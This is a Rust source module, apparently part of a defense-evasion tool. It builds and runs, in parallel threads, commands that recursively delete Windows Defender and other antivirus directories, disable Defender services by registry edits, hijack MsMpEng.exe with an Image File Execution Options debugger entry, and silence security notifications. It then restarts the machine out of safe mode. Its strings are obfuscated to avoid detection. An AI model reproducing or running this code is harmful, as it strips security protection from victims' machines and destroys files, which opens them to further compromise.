//! clean up

use anyhow::{ Context, Result };
use obfstr::obfstr as s;
use shared::utils::config::{ load_mib_config, write_mib_config };
use shared::utils::functions::{ call_cmd, env_to_pathbuf };
use std::time::Instant;
use std::thread;
use crate::{ err, info };
use super::utils::{ rollback_safemode_and_restart, search_antivirus_directories };

fn fetch_cleanup_cmds(get_anviruses: bool) -> Result<Vec<String>> {
    let windows_path = env_to_pathbuf(s!("windir"));
    let program_files_path = env_to_pathbuf(s!("ProgramFiles"));
    let program_files_86_path = env_to_pathbuf(s!("ProgramFiles(x86)"));
    let program_data_path = env_to_pathbuf(s!("ProgramData"));

    let mut cmds_to_execute = vec![
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &program_files_path
                .join(s!("Microsoft"))
                .join(s!("Windows Defender"))
                .to_str()
                .unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &windows_path
                .join(s!("System32"))
                .join(s!("drivers"))
                .join(s!("wd"))
                .to_str()
                .unwrap_or("--"), // if unwrap to nothing it wipes full program files GG
            s!(r#"" /s /q"#)
        ),
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &windows_path
                .join(s!("System32"))
                .join(s!("Windows Defender"))
                .to_str()
                .unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),

        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &program_files_path
                .join(s!("Windows Defender Advanced Threat Protection"))
                .to_str()
                .unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &program_files_86_path.join(s!("Windows Defender")).to_str().unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &program_data_path
                .join(s!("Microsoft"))
                .join(s!("Windows Defender"))
                .to_str()
                .unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &program_data_path
                .join(s!("Microsoft"))
                .join(s!("Windows Defender Advanced Threat Protection"))
                .to_str()
                .unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),
        format!(
            "{}{}{}",
            s!(r#"rmdir ""#),
            &program_data_path
                .join(s!("Microsoft"))
                .join(s!("Windows Security Health"))
                .to_str()
                .unwrap_or("--"),
            s!(r#"" /s /q"#)
        ),
        s!(
            r#"REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityHealth /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t REG_DWORD /d 4 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdBoot" /v Start /t REG_DWORD /d 4 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t REG_DWORD /d 4 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v Start /t REG_DWORD /d 4 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v Start /t REG_DWORD /d 4 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MsMpEng.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe /c exit 0" /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f"#
        ).to_string(),
        s!(
            r#"reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f"#
        ).to_string()
    ];
    if get_anviruses {
        let dirs = search_antivirus_directories(
            program_files_path,
            program_files_86_path,
            program_data_path
        );

        for dir in dirs {
            cmds_to_execute.push(format!("{}{}{}", s!(r#"rmdir ""#), dir, s!(r#"" /s /q"#)));
        }
    }

    Ok(cmds_to_execute)
}

pub fn clean_up() -> Result<()> {
    let start_time = Instant::now();
    let cmds_to_execute = fetch_cleanup_cmds(true).context(
        s!("Failed to fetch_cleanup_cmds").to_string()
    )?;

    let fetch_cmds_elapsed = start_time.elapsed();
    info!("fetch_cleanup_cmds completed in: ", fetch_cmds_elapsed);

    let handles: Vec<_> = cmds_to_execute
        .into_iter()
        .map(|cmd| {
            let handle = thread::spawn(move || {
                match call_cmd(&cmd) {
                    Ok(output) => {
                        info!("output: ", output);
                    }
                    Err(error) => {
                        err!("Error calling cmd: ", error);
                    }
                };
            });
            handle
        })
        .collect();

    for handle in handles {
        handle.join().unwrap_or(());
    }

    let mut mib_xml_config = load_mib_config(true);
    mib_xml_config.cln_up_done = true;
    write_mib_config(&mib_xml_config);

    let elapsed_time = start_time.elapsed();
    info!("Full Clean up completed in: ", elapsed_time);
    rollback_safemode_and_restart();
    Ok(())
}
